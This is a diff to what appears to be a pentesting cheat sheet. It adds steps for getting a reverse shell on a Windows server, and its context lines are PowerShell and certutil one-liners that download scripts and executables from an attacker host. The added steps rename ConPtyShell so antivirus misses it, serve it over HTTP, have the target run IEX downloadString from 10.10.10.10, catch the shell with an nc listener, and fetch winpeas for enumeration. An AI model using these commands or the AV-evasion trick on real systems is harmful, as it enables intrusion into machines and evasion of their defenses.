@@ -74,4 +74,22 @@ IEX(New-Object Net.WebClient).downloadstring(\"http://attacker_ip/shell.ps1\")
 iwr -UseBasicParsing -Uri http://attacker_ip/pr.exe OutFile 'the_path_where_you_want_to_store_your_pr.exe'
 certutil -urlcache -split -f http://attacker_ip
 
+
+# Revers shell on on windows server.
+
+On server do below:
+5. IEX(New-Object Net.WebClient).downloadString("http://10.10.10.10/rev.ps1")
+6. run hackerzzz 10.10.10.10
+
+On attacker side:
+
+1. Download reverse shell ConPtyShell(in this shell find and rename Invoke-ConPtyShell into hackerzzz as AV will detect this file, also rename any ConPtyShell to hackerzzz)
+2. Name it as rev.ps1
+3. Run local Simple http server and copy in www this rev.ps1
+4. Also run stty raw -echo; (stty size; cat) | nc -lvnp 9001
+
+then from reversshell's console type: wget http://10.10.10.10/winpeas.exe  for local enumeration
+
+Any questions look for acute for ippsec.rocks.
+
 --------------------------------------------------------
